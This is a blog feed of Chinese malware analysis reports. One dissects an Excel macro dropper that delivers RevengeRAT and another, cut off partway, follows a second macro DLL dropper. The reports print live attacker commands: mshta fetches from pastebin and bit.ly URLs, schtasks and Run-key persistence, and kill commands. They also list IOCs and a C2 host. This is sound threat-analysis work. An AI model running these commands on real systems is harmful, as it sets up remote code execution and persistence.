        <content type="html"><![CDATA[<center><font size = 8><b>05 APT宏病毒分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>Order__679873892.xls</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>宏病毒、远控木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>40.5 KB (41,472 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>2A8A7254D6A2D75BC55F27F732C97DCC</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该样本最终实现执行一个远控程序，样本通过宏代码访问网址中的JS代码，调用mshta执行JS代码解析出的VBS代码。其中多重混淆，并且全程都是以无文件方式执行的，从指定URL上获取两端PE数据流，通过反射加载来创建傀儡进程执行远控程序，在一定程度上可以逃避杀软的查杀，可见该样本的执行过程十分隐蔽，技术手段高超。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/05_%E5%AE%8F%E7%97%85%E6%AF%92.png" alt="05_宏病毒"></p><h1 id="0x01-样本详细分析"><a href="#0x01-样本详细分析" class="headerlink" title="0x01 样本详细分析"></a>0x01 样本详细分析</h1><h2 id="查看宏"><a href="#查看宏" class="headerlink" title="查看宏"></a>查看宏</h2><p>该样本是一个Excel文件并且带有宏，首先查看宏代码，发现有密码，可以使用工具offkey获取密码来解密。</p><p>查看宏代码，其中值得关注的便是函数<code>workbook_Open()</code>，Workbook_Open和Auto_Open差不多都能实现在打开office时自动运行。该函数中有明显的执行函数<code>shell()</code>，然后在shell处下断点，然后进行调试来查看所执行的指令。调试出来的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;mshta http[:]&#x2F;&#x2F;bit.ly&#x2F;8hsshjahassahsh&quot;</span><br></pre></td></tr></table></figure><p>通过执行mshta，去访问指定的域名。调试结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568959569555.png" alt="1568959569555"></p><h2 id="异常JS代码"><a href="#异常JS代码" class="headerlink" title="异常JS代码"></a>异常JS代码</h2><p>访问指令中的域名，发现是一个正常的网页，然后将网页源码拷下来，发现该网页源码中，有一段异常的JS代码，其中使用了函数<code>document.write</code>。异常JS代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986274183.png" alt="1568986274183"></p><p>使用<code>console.log</code>解析异常JS代码，解析出来了一个VBS代码。也就说明了网页执行到该异常JS代码时，会通过执行<code>document.write</code>，将该VBS代码嵌在了网页文档中，所以==宏调用的mshta真正执行的其实就是这个VBS代码==。这里将其保存下来，并命名为1.vbs。解析出来的VBS代码，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986836029.png" alt="1568986836029"></p><p>调试该VBS代码（1.vbs），发现该VBS再次调用了指令：<code>mshta</code>，去访问网址来执行操作。mshta指令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta “http[:]&#x2F;&#x2F;www.pastebin.com&#x2F;raw&#x2F;nv5d9pYu&quot;</span><br></pre></td></tr></table></figure><p>调试1.VBS结果如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569030736561.png" alt="1569030736561"></p><h2 id="添加计划任务和开机自启"><a href="#添加计划任务和开机自启" class="headerlink" title="添加计划任务和开机自启"></a>添加计划任务和开机自启</h2><p>再去访问1.VBS执行指令中的网址，发现还是一个正常的网址，网址源码中含有异常JS代码。1.VBS所访问网址中的异常JS代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036067621.png" alt="1569036067621"></p><p>解析该JS代码，发现与上一步一模一样的，还是==解析出来VBS代码，交由mshta==去执行。该样本通过这样的手段，访问正常的网站，然后去执行隐藏在网页中的恶意代码，来隐藏自身的恶意行为，并且可以==实现无文本执行恶意行为==，来逃避查杀。解析出的VBS代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036586575.png" alt="1569036586575"></p><p>将调试出来的VBS代码保存下来，并命名为2.VBS。然后调试2.VBS，2.VBS主要行为如下：</p><p>1.关闭进程，关闭Word、Excel、Publisher、PPT程序。关闭这些程序，目的可能是用来隐藏恶意程序的来源与 。 执行指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c taskkill &#x2F;f &#x2F;im winword.exe &amp; taskkill &#x2F;f &#x2F;im excel.exe &amp; taskkill &#x2F;f &#x2F;im MSPUB.exe &amp; taskkill &#x2F;f &#x2F;im POWERPNT.EXE &amp; exit</span><br></pre></td></tr></table></figure><p>2.设置两个计划任务，分别为每60分钟和每300分钟调用一次mshta，并分别访问了两个不同的URL。而且还将计划任务的名字设置为与系统更新相关的内容。执行指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 60 &#x2F;tn &quot;Windows Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;vXpe74L2&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 300 &#x2F;tn &quot;Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;JdTuFmc5&quot; &#x2F;F</span><br></pre></td></tr></table></figure><p>3.设置开机自启动项，修改注册表添加自启动项。致使每次开机便会执行mshta，访问指定URL。修改的注册表，及执行的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate&quot;</span><br><span class="line">&quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;CGe3S2Vf&quot;,&quot;REG_EXPAND_SZ&quot;</span><br></pre></td></tr></table></figure><p>调试2.VBS结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569043864988.png" alt="1569043864988"></p><p>其中计划任务和开机自启项中，mshta访问的URL如下表：</p><table><thead><tr><th>访问的URL</th></tr></thead><tbody><tr><td>http[:]//pastebin.com/raw/vXpe74L2</td></tr><tr><td>http[:]//pastebin.com/raw/JdTuFmc5</td></tr><tr><td>http[:]//pastebin.com/raw/CGe3S2Vf</td></tr></tbody></table><h2 id="执行Powershell"><a href="#执行Powershell" class="headerlink" title="执行Powershell"></a>执行Powershell</h2><p>继续去访问这3个URL，发现这3个URL的内容都是一样的，可见所有的持久化攻击的目的都是一致的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569044804280.png" alt="1569044804280"></p><p>这里还是与之前的套路是一样的，还是将JS解析后的VBS代码，==交由mshta去执行解析后vbs中的代码,来实现无文本攻击==。解析出的VBS代码结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569045476737.png" alt="1569045476737"></p><p>将解析出来的VBS保存为3.VBS，然后调试该VBS代码，发现3.VBS执行了powershell指令，调试结果如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569046502014.png" alt="1569046502014"></p><p>查看<code>Powershell</code>的指令，发现powershell，将初始化的数据转为字符串并执行。这里通过调试来获取Powershell执行的数据，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569049413413.png" alt="1569049413413"></p><h2 id="从网页获取文件数据"><a href="#从网页获取文件数据" class="headerlink" title="从网页获取文件数据"></a>从网页获取文件数据</h2><p>分析powershell执行的指令，首先通过<code>test-connection</code>不断尝试谷歌进行链接，来判断网络连接情况。</p><p>然后调用<code>CallByName</code>执行<code>DownloadString</code>从执行下表中的两个链接中下载字符串，然后通过IEX执行下载后的指令。</p><table><thead><tr><th>下载字符串连接地址：</th></tr></thead><tbody><tr><td>http[:]//pastebin.com/raw/wMG90xwi</td></tr><tr><td>http[:]//pastebin.com/raw/W455MKAZ</td></tr></tbody></table><p>代码如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569059441086.png" alt="1569059441086"></p><h3 id="1-获取DLL文件流"><a href="#1-获取DLL文件流" class="headerlink" title="1.获取DLL文件流"></a>1.获取DLL文件流</h3><p>访问第一个网址==wMG90xwi==，发现从该网址上下载下来的==powershell==指令与上一个差不多，都是将初始化的数据，然后执行。这里直接调试，并将调试的结果输出到7.txt中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569060163393.png" alt="1569060163393"></p><p>查看生成的7.txt，发现又是一层执行。可以从中看出是一个==PE==文件，数据开头4D5A，而且该powershell执行的主要目的在于替换其中的数据，然后替换完数据，由通过load去加载替换后的比特流，初步推断替换后的是一个dll文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569065604284.png" alt="1569065604284"></p><p>通过将<code>IEX</code>替换为<code>out-file</code>, 获取这个PE文件。通过==DIE==查看该PE文件，发现该PE文件正如猜想为一个dll文件，这也就说明了，这里通过==函数<code>load</code>加载了一个从网上获取到的dll文件的数据流==，依旧还是无文本模式。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066094943.png" alt="1569066094943"></p><h3 id="2-获取exe文件流"><a href="#2-获取exe文件流" class="headerlink" title="2.获取exe文件流"></a>2.获取exe文件流</h3><p>访问第二个网址==W455MKAZ==，发现这次从该网址上下载的字符串直接是一个PE文件的数据流，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066429620.png" alt="1569066429620"></p><p>这里将其转换为二进制粘贴到文件中，就能获得该文件。用==DIE==查该文件，发现是一个.Net编写的exe文件。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066582960.png" alt="1569066582960"></p><p>上面两步获取的文件流，并没有保存到本地，而是以比特流的形式存储的。这样的目的是不生成文件，很大程度上能做到免杀。</p><h2 id="反射动态加载"><a href="#反射动态加载" class="headerlink" title="反射动态加载"></a>反射动态加载</h2><p>获取完EXE和DLL文件流之后，该样本通过==反射加载==，加载了该DLL。执行了该DLL中的==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==方法，并将<code>（&quot;MSBuild.exe&quot;，$f）</code>作为参数传入该方法中，其中$f为获取到的EXE的二进制文件流数据。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569068224763.png" alt="1569068224763"></p><h2 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h2><p>该样本通过反射加载了DLL文件中的函数==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，并传进了两个参数，一个是字符串<code>&quot;MSBuild.exe&quot;</code>，一个exe文件的比特流数组。查看该函数对这两个参数或这个函数干了些什么。</p><h3 id="1-解混淆"><a href="#1-解混淆" class="headerlink" title="1.解混淆"></a>1.解混淆</h3><p>通过反编译工具==dnspy==，查看该.Net编写的dll文件时，发现其中有大量的混淆内容，查看编辑模块中的自定义特性发现该DLL文件是通过<code>ConfuserEx</code>混淆过的。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069138757.png" alt="1569069138757"></p><p>可以通过该混淆制作者公布的工具，进行解混淆。并找到反射加载的函数，还发现该DLL文件中，有一些创建傀儡进程会用到的API，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069784184.png" alt="1569069784184"></p><h3 id="2-创建进程并写入数据"><a href="#2-创建进程并写入数据" class="headerlink" title="2.创建进程并写入数据"></a>2.创建进程并写入数据</h3><p>从反射加载的函数，往下跟，发现函数<code>semthod_0</code>,创建进程MSBuild，并将其挂起，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070252322.png" alt="1569070252322"></p><p>然后，该函数还往该进程内存中写入获取到的EXE文件的数据流，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070459004.png" alt="1569070459004"></p><p>通过执行函数<code>ResumeThread</code>恢复线程，执行EXE文件，完成傀儡进程。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569071085088.png" alt="1569071085088"></p><h2 id="实施远控"><a href="#实施远控" class="headerlink" title="实施远控"></a>实施远控</h2><p>通过反射加载该DLL文件，执行方法==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，来创建傀儡进程，将获取到的EXE加载到==正常程序MSBuild.exe中==，来免杀。</p><p>注入该傀儡进程的获取到的EXE文件，实质上是一个==远控==，通过查询互斥体，可知道该远控为<code>RevengeRAT</code>，该远控的C&amp;C服务器为：==meandmyjoggar.duckdns.org:777==，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569072354028.png" alt="1569072354028"></p><p>由于该<code>RevengeRAT</code>远控是一个成熟的远控程序，网上也可以直接下载到该远控软件，这里就不过多去分析该远控程序。</p><h1 id="0x02-查杀方案"><a href="#0x02-查杀方案" class="headerlink" title="0x02 查杀方案"></a>0x02 查杀方案</h1><ul><li><p>关闭傀儡进程</p><p>关闭创建的<code>MSBuild.exe</code>的傀儡进程。</p></li><li><p>删除计划任务</p><p>删除创建的两个计划任务：<code>Windows Update</code>、<code>Update</code></p><p>可执行如下指令删除计划任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;Delete &#x2F;TN &quot;Windows Update&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;Delete &#x2F;TN Update&quot; &#x2F;F</span><br></pre></td></tr></table></figure></li><li><p>删除开机自启动项</p><p>删除注册表项==HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate==</p></li></ul><h1 id="0x03-样本溯源"><a href="#0x03-样本溯源" class="headerlink" title="0x03 样本溯源"></a>0x03 样本溯源</h1><p>通过mshta访问的网址如下表：</p><table><thead><tr><th>捆绑恶意JS代码网址：</th></tr></thead><tbody><tr><td>==http[:]//bit.ly/8hsshjahassahsh==</td></tr><tr><td>==http[:]//pastebin.com/raw/nv5d9pYu==</td></tr><tr><td>==http[:]//pastebin.com/raw/vXpe74L2==</td></tr><tr><td>==http[:]//pastebin.com/raw/JdTuFmc5==</td></tr><tr><td>==http[:]//pastebin.com/raw/CGe3S2Vf==</td></tr><tr><td>==http[:]//pastebin.com/raw/wMG90xwi==</td></tr><tr><td>==http[:]//pastebin.com/raw/W455MKAZ==</td></tr></tbody></table><p>远控<code>RevengeRAT</code>的C&amp;C服务器：</p><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td>==meandmyjoggar.duckdns.org:777==</td></tr></tbody></table><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该样本通过Excel进行传播，攻击手段高超，全程无文本攻击，其间进行了多次混淆，通过访问正常网址获取指令和数据，反射加载获取到的DLL文件流，来创建傀儡进程，最终执行远控程序。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 宏病毒 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> APT </tag>
            
            <tag> 非PE脚本语言样本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宏病毒分析报告</title>
      <link href="2019/10/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/"/>
      <url>2019/10/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>04 宏病毒分析报告</b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center">3EFFEBA64D9A1A4DD1BDDAEB1858E4D0.xls</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>宏病毒、下载器</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>346112 bytes</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>3EFFEBA64D9A1A4DD1BDDAEB1858E4D0</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该样本通过宏代码，将存储在Excel表中的PE数据，写入DLL文件中，然后加载该DLL文件，执行其函数，最终实现将主机信息发送至远端服务器，并从远端服务器下载文件执行。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/04_%E5%AE%8F%E7%97%85%E6%AF%92.png" alt="04_宏病毒"></p><h1 id="0x01-样本行为分析"><a href="#0x01-样本行为分析" class="headerlink" title="0x01 样本行为分析"></a>0x01 样本行为分析</h1><p>该样本是一个Excel文件并且含有宏。其中Excel界面同其他宏病毒一样，显示迷惑信息，诱导使用者启用宏。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569412801269.png" alt="1569412801269"></p><h2 id="文件写入行为分析"><a href="#文件写入行为分析" class="headerlink" title="文件写入行为分析"></a>文件写入行为分析</h2><p>运行宏后，样本释放了多个文件，如图1所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569144868910-1569145595739.png" alt="1569144868910"></p><center>图1</center>## 网络行为分析<p>运行宏后，该Excel文件向远程服务器进行了TCP请求，访问IP：==195.126.214.226==</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569145641922.png" alt="1569145641922"></p><center>图2</center># 0x02 样本详细分析<h2 id="查看宏代码"><a href="#查看宏代码" class="headerlink" title="查看宏代码"></a>查看宏代码</h2><p>查看自动运行函数<code>workbook_open</code>，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569378101721.png" alt="1569378101721"></p><p>分析<code>workbook_open</code>，发现函数只执行了<code>UserForm1.show</code>，这点就很可疑，因为userForm本身是一个图片，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569412973717.png" alt="1569412973717"></p><p>这里右键查看模块<code>UserForm1</code>的代码，发现里面暗藏玄机，执行了函数<code>CreateGifFile</code>,如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569413132917.png" alt="1569413132917"></p><p>查看函数<code>CreateGifFile</code>,发现其中释放出了一个==DLL文件==，并执行了该DLL文件中的一个函数。下面将详细分析该函数究竟执行了那些行为，函数如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569413932292.png" alt="1569413932292"></p><p><strong>拼接路径</strong></p><p>根据操作系统的位数，拼接不同的文件路径，拼接出来的路径就是该样本释放文件的路径，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569414410071.png" alt="1569414410071"></p><p><strong>释放文件<code>oleObject1.bin</code></strong></p><p>先将当前工作表复制到一个新的工作簿中，并保存为==13.xlsx==，然后又修改该文件的后缀，将其修改为==13.xlsx.zip==，然后解压该zip文件夹 ==xl\embeddings\==目录下的<code>oleObject1.bin</code>文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569415043752.png" alt="1569415043752"></p><p>首先释放的3个文件，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569415375138.png" alt="1569415375138"></p><p>执行函数<code>ReadAndWriteExtractedBinFile</code>，读取文件==oleObject1.bin==中的PE数据，并将PE数据写入<code>exchange1.dll</code>中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419064051.png" alt="1569419064051"></p><p><strong>加载<code>exchange1.dll</code>并执行函数<code>Amway</code></strong></p><p>先切换路径至==%AppData%路径下==，然后加载<code>exchange1.dll</code>，并执行其函数<code>Amway</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419166214.png" alt="1569419166214"></p><p>其中<code>k32LL</code>为从==kernel32.dll==中获取的<code>loadlibrary</code>，并将其别名为：<code>k32LL</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569419372444.png" alt="1569419372444"></p><h2 id="分析释放出来的DLL文件"><a href="#分析释放出来的DLL文件" class="headerlink" title="分析释放出来的DLL文件"></a>分析释放出来的DLL文件</h2><p>查看DLL文件<code>exchange1.dll</code>的导出表，发现其导出函数只有一个导出函数<code>initTest</code>。与该样本要调用的函数<code>Amway</code>不同。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/04_%E5%AE%8F%E7%97%85%E6%AF%92/1569425835760.png" alt="1569425835760"></p><p>初步推断该DLL文件，是一个==带壳的DLL文件==，首先需要进行脱壳，这里用X64dbg进行脱壳。</p><p>首先在DLL文件的入口点，用一次==ESP定律==，在push后，给<code>ESP</code>下硬件断点，如图：</p><p><img 